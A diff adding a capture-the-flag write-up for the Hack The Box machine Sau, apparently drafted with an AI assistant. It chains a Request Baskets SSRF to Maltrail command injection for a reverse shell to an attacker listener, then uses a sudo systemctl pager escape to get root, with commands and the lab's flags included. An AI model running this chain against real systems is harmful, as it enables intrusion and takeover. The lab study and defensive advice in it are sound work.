@@ -1,3 +1,271 @@
+# HTB Writeup — Sau (10.10.11.224)
+
+**Difficulty:** Easy  
+**Target:** Linux — Request Baskets & Maltrail chaining → puma (user) → root  
+**IP:** `10.10.11.224`  
+**Author:** [your name / handle]  
+**Date:** 2025-10-17
+
+---
+
+## TL;DR (one-line)
+Chained SSRF in *Request Baskets* (CVE-2023-27163) → reach internal Maltrail v0.53 → unauthenticated command injection → reverse shell as `puma` → sudo/systemd pager escape → `root`.
+
+**Flags recovered**
+- **User:** `b19f1eebf68037fd569c8aaf9dfb0d30`  
+- **Root:** `b46e1a8fb8e2f84c172066ac43581287`
+
+---
+
+## 1) Recon / Enumeration
+
+**Scans used:** `nmap/zenmap`, `rustscan` (plus manual browser inspection)
+
+**Open services discovered**
+```
+22/tcp   open   ssh    OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
+80/tcp   filtered http
+55555/tcp open  http   Golang net/http server (Request Baskets)
+```
+
+Rustscan fingerprint revealed SSH host keys and a web service on port `55555`. Nmap shows the HTTP service identifies as **Request Baskets** (http-title).
+
+Visiting `http://10.10.11.224:55555/` shows a small web app that lets you create “baskets” (named containers that collect HTTP requests). The UI allows setting a *forward_url* and proxy-related options — a weaponizable SSRF vector.
+
+---
+
+## 2) Target behavior / important app features
+
+**Request Baskets** features relevant to exploitation:
+
+- Create a named basket (e.g. `p5naosm`) and receive a token.
+- The basket provides a public URL that you can send requests to; the service captures those requests.
+- There is a *forward_url* option: the basket can forward incoming requests to an arbitrary URL (used as a simple proxy).
+- Config flags include **Proxy Response** (return the proxied response to the client) and **Expand Forward Path** (append original path to forward URL).
+- The source repo mentions **CVE-2023-27163 — SSRF** (server-side request forgery) affecting the project.
+
+These features allow you to make the app connect to arbitrary internal addresses (127.0.0.1) from the target.
+
+---
+
+## 3) Proof-of-concept: Confirming SSRF/proxying
+
+**Create basket and set forward_url to attacker**
+- Create basket via web UI → got token and basket name `p5naosm`.
+- Set `forward_url` to `http://10.10.14.9:80` (attacker listener); enable **Proxy Response** / **Expand Forward Path** as needed.
+
+**On attacker:**
+```bash
+nc -lnvp 80
+```
+
+**Result (example output)**
+```
+listening on [any] 80 ...
+connect to [10.10.14.9] from (UNKNOWN) [10.10.11.224] 48704
+GET / HTTP/1.1
+Host: 10.10.14.9
+User-Agent: ...
+X-Do-Not-Forward: 1
+```
+
+This proves the basket will open outbound connections to the configured *forward_url* and forward the client request — SSRF confirmed.
+
+---
+
+## 4) Pivot: reach internal Maltrail UI
+
+**Action**
+- Set `forward_url` to `http://127.0.0.1:80`
+- Enable **Proxy Response** and **Expand Forward Path**
+
+**Observation**
+- Visiting the basket URL now returned content from an internal service: **Maltrail v0.53** (an internal monitoring web UI).
+
+This confirms we can use the SSRF/proxy to reach services bound to localhost on the target.
+
+---
+
+## 5) Exploit Maltrail → RCE (unauthenticated command injection)
+
+Maltrail v0.53 is known to have an unauthenticated OS command injection (public exploit). Instead of brute-forcing, use a public exploit adapted to the SSRF forward URL.
+
+**Exploit execution (example used)**
+```bash
+# On attacker: listen for reverse shell
+nc -lnvp 4444
+
+# On attacker: run provided exploit script (points Maltrail to our listener via SSRF)
+python3 exploit.py 10.10.14.9 4444 http://10.10.11.224:55555/p5naosm
+```
+
+**Result**
+```
+connect to [10.10.14.9] from (UNKNOWN) [10.10.11.224] 48704
+# shell prompt
+whoami
+puma
+id
+uid=1001(puma) gid=1001(puma) groups=1001(puma)
+```
+
+You now have an interactive shell as `puma`.
+
+---
+
+## 6) Post-exploitation — stabilize shell
+
+Received shell from web exploit may be limited. Recommended upgrade to fully interactive TTY:
+
+```bash
+# on attacker after getting a basic shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# or the script trick:
+script /dev/null -c bash
+# then Ctrl+Z, stty -raw echo; fg, press Enter twice
+```
+
+Now you should have job control and a usable prompt for enumeration.
+
+---
+
+## 7) Privilege escalation — abusing sudo/systemctl pager (CVE chaining)
+
+**Check sudo rights:**
+```bash
+sudo -l
+```
+
+**Output excerpt**
+```
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
+
+This allows `puma` to run `systemctl status trail.service` as root without a password.
+
+**Systemd version**
+```bash
+systemctl --version
+# systemd 245 (245.4-4ubuntu3.22)
+```
+
+**Why this is exploitable**
+- On systemd versions prior to `247`, `systemctl status` may invoke a pager (less) without setting `LESSSECURE=1`.
+- `less` supports shell escapes (e.g., `!sh`) which spawn a shell. If `less` runs as root, shell escapes spawn root shells.
+- Because `sudo` allows running `systemctl status trail.service` as root (NOPASSWD), invoking that command leads to root-owned `less`, which can be escaped to run commands as root.
+
+**Exploit flow (conceptual)**
+1. `sudo /usr/bin/systemctl status trail.service`
+2. When output opens in `less`, trigger a shell escape: in `less` type `!/bin/bash` (or `!sh`).
+3. The spawned shell runs as root → `root` shell obtained.
+
+**Result**
+- After executing the pager-escape, you become root and can read root flag:
+```
+cat /root/root.txt
+# b46e1a8fb8e2f84c172066ac43581287
+```
+
+**User flag**
+```
+cat /home/puma/.../user.txt
+# b19f1eebf68037fd569c8aaf9dfb0d30
+```
+
+---
+
+## 8) Why this chain works (brief analysis)
+
+- **CVE-2023-27163 (Request Baskets SSRF)**: The app allows forwarding/ proxying to arbitrary URIs, enabling SSRF to host-local services.
+- **Maltrail v0.53 RCE**: Maltrail’s web UI had unauthenticated command injection allowing remote command execution; combined with SSRF, it becomes reachable and exploitable from attacker.
+- **sudo/systemctl misconfiguration**: Sudoers entry grants NOPASSWD execution of a root command that uses a pager (less) not hardened in older systemd; less shell escapes are leveraged to spawn a root shell.
+
+---
+
+## 9) Reproducible commands (concise)
+
+**Create basket & prove forwarding**
+```bash
+# create basket via UI, set forward_url to attacker's listener
+nc -lnvp 80
+# visit basket URL -> see GET requests arrive
+```
+
+**Maltrail exploit (example)**
+```bash
+# listen
+nc -lnvp 4444
+
+# run exploit script pointing at SSRF endpoint
+python3 exploit.py 10.10.14.9 4444 http://10.10.11.224:55555/p5naosm
+```
+
+**Stabilize shell**
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# or script trick:
+script /dev/null -c bash
+# Ctrl+Z
+stty -raw echo; fg
+# press Enter twice
+```
+
+**Privilege escalation**
+```bash
+sudo -l
+sudo /usr/bin/systemctl status trail.service
+# when pager opens, enter:
+!/bin/bash
+# now root
+id
+cat /root/root.txt
+```
+
+---
+
+## 10) Defensive recommendations
+
+**Fix SSRF risk**
+- Validate and restrict allowed `forward_url` values; disallow arbitrary internal addresses (127.0.0.1, 169.254.*.*, etc.).
+- Disable user-controlled proxying or require strict allowlists.
+- Set reasonable default timeouts and request limits.
+
+**Fix Maltrail**
+- Upgrade Maltrail to a fixed version; patch or remove vulnerable endpoints.
+- Ensure web UIs that accept external input escape/sanitize shell-sensitive fields.
+
+**Fix systemd/sudo issue**
+- Remove risky sudoers entries allowing systemctl or other paged outputs with NOPASSWD.
+- Update systemd to ≥247 where fixes for LESSSECURE handling were applied.
+- Set `LESSSECURE=1` for env when calling pagers or use `--no-pager`/`--no-ask-password` variants when possible.
+- Audit sudoers for NOPASSWD entries and limit commands to absolute minimum.
+
+---
+
+## 11) Notes & artifacts
+
+**Artifacts to keep (examples)**
+- `ike_capture.pcap` (not relevant here) / HTTP request logs from basket
+- `exploit.py` used for Maltrail RCE (source)
+- Reverse shell transcripts / `nc` logs
+- Outputs of `sudo -l`, `systemctl --version`, `id` / `whoami`
+- Captured `user.txt` and `root.txt` flags
+
+---
+
+## 12) Lessons learned
+
+- SSRF is a powerful pivot; features that proxy/forward requests are high-value attack surfaces.
+- Local-only services (127.0.0.1) should be considered sensitive and not reachable via user-configurable forwarding.
+- Chaining low-to-medium vulnerabilities can yield full compromise without needing complex zero-days.
+- Sudo configs and system utilities (pagers) should be carefully considered when delegating root commands.
+
+---
+
+*End of writeup — save findings and evidence to your lab repository. If you want, I can export this file as a downloadable Markdown file or convert to PDF/DOCX.*
+
+---
 originial notes:
 <details>
 Sau
